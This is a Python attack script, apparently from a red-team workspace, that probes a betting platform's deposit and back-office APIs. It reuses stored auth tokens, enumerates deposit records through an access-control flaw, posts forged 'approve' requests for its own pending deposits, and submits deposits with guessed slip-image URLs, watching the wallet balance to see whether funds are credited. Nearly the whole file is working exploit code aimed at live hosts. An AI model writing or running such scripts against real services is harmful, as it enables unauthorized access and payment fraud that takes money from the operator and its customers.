#!/usr/bin/env python3
"""probe_slip_replay.py — Replay existing approved slip URL for a new deposit.

   ATTACK: The RTDB wallet node shows transaction_id=3d939de8 (approved 50000 SCB).
   If we can get that deposit's slip_image_url and reuse it, the auto-slip
   processor may validate it again (slip replay attack).

   Also: GET deposit-transaction with various ID/path formats.
"""
import json, pathlib, requests, uuid, time, base64

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
_new = pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt")
FB_TOKEN = (_new.read_text().strip() if _new.exists() and _new.stat().st_size > 100
            else pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip())
parts = FB_TOKEN.split(".")
pad = parts[1] + "=" * (-len(parts[1]) % 4)
FB_UID = json.loads(base64.urlsafe_b64decode(pad)).get("sub", "")

HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json",
       "Cookie": f"AWSALB={AWSALB}"}
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

# Known transaction ID from RTDB wallet node (previously approved 10000 SCB)
KNOWN_TX_ID = "3d939de8-a02c-4d3b-9ae1-fa8737737cb5"

print(f"wallet before: {wallet()}")

# ── 1. Try to GET the real deposit to find its slip_image_url ────────────────
print(f"\n=== GET deposit {KNOWN_TX_ID[:8]} ===")
for path in [
    f"/mb/deposit-transaction/{KNOWN_TX_ID}",
    f"/mb/deposit-transactions/{KNOWN_TX_ID}",
    f"/mb/deposit/{KNOWN_TX_ID}",
    f"/mb/deposits/{KNOWN_TX_ID}",
    f"/mb/transaction/{KNOWN_TX_ID}",
    f"/mb/deposit-transaction?transaction_id={KNOWN_TX_ID}",
    f"/mb/deposit-transaction?id={KNOWN_TX_ID}",
]:
    r = requests.get(f"{MGAPI}{path}", headers=HDR, timeout=10)
    if r.status_code == 200:
        print(f"  [!!!] GET {path}: HTTP 200: {r.text[:400]}")
    elif r.status_code not in (404, 405, 400):
        print(f"  GET {path}: HTTP {r.status_code}: {r.text[:100]}")

# ── 2. bgapi GET deposit list (BOLA still works) ─────────────────────────────
print(f"\n=== bgapi deposit list (GET works!) ===")
bo_hdrs = {**HDR, "Origin": "https://manage.vak88z2.com"}

for path in [
    "/bo/deposit-transaction?domain=m.vak88z2.com&skip=0&limit=10",
    "/bo/deposit?domain=m.vak88z2.com&skip=0&limit=10",
    "/bo/slip-deposit?domain=m.vak88z2.com&skip=0&limit=10",
    "/bo/slip-deposit-assign-task?domain=m.vak88z2.com&skip=0&limit=10",
    "/bo/info/deposit?domain=m.vak88z2.com",
]:
    r = requests.get(f"{BGAPI}{path}", headers=bo_hdrs, timeout=10)
    if r.status_code == 200:
        data = r.json()
        items = data if isinstance(data, list) else data.get("data", data.get("items", [data]))
        print(f"  [!!!] GET {path.split('?')[0]}: HTTP 200 ({len(items) if isinstance(items,list) else '?'} items)")
        if isinstance(items, list):
            for it in items[:5]:
                print(f"    id={str(it.get('id',''))[:8]} amt={it.get('deposit_amount',it.get('amount','?'))} "
                      f"status={it.get('approve_status',it.get('status','?'))} "
                      f"slip={str(it.get('slip_image_url',''))[:40]}")
    elif r.status_code not in (404, 405):
        print(f"  GET {path.split('?')[0]}: HTTP {r.status_code}: {r.text[:100]}")

# ── 3. bgapi POST approve known deposit IDs ──────────────────────────────────
print(f"\n=== bgapi POST approve (AWSALB) ===")
pending_dep_ids = [
    "a3929435-0589-4713-8437-9489af89dc51",  # probe_signurl
    "b0783e2e-1051-453f-800c-b83f670cd93f",  # vak_dep
    "1d7ffcb0-0000-0000-0000-000000000000",  # probe_dep_inject (partial)
]

# Try bgapi POST approve endpoint
approve_paths = [
    f"/bo/slip-deposit-assign-task/admin-do-task",
    f"/bo/deposit-transaction/approve",
    f"/bo/deposit/approve",
]
for path in approve_paths:
    r = requests.post(f"{BGAPI}{path}?domain=m.vak88z2.com",
                      headers=bo_hdrs,
                      json={"deposit_id": "a3929435-0589-4713-8437-9489af89dc51",
                            "action": "approve", "amount": 100.0},
                      timeout=10)
    if r.status_code not in (401, 404, 405):
        print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  POST {path}: HTTP {r.status_code}")

# ── 4. Try slip_image_url = existing real GCS slip URL format ────────────────
print(f"\n=== Deposit with guessed real GCS slip URLs ===")
# Common GCS paths for slip images
for slip_path_fmt in [
    f"slips/{uuid.uuid4()}.png",
    f"slips/{uuid.uuid4()}.jpg",
    f"deposit-slips/{uuid.uuid4()}.jpg",
    f"uploads/{uuid.uuid4()}.jpg",
    f"https://storage.googleapis.com/vak88/slips/{uuid.uuid4()}.jpg",
    f"https://firebasestorage.googleapis.com/v0/b/vak88.appspot.com/o/slips%2F{uuid.uuid4()}.jpg?alt=media",
]:
    r = requests.post(f"{MGAPI}/mb/deposit-transaction",
                      headers=HDR,
                      json={"deposit_amount": 1000.0, "slip_image_url": slip_path_fmt,
                            "is_auto_slip": True,
                            "payment_bank_information_id": BANK_INFO,
                            "deposit_account_id": DEP_ACCT},
                      timeout=10)
    d = r.json() if r.ok else {}
    print(f"  {slip_path_fmt[:50]}: HTTP {r.status_code}  "
          f"id={str(d.get('id',''))[:8]}  "
          f"approve_status={d.get('approve_status','?')}")
    if d.get("approve_status") in ("success", "approved"):
        print(f"  [!!!] AUTO-APPROVED!")
        time.sleep(1)
        print(f"  wallet: {wallet()}")

print(f"\nwallet final: {wallet()}")
print("=== DONE ===")
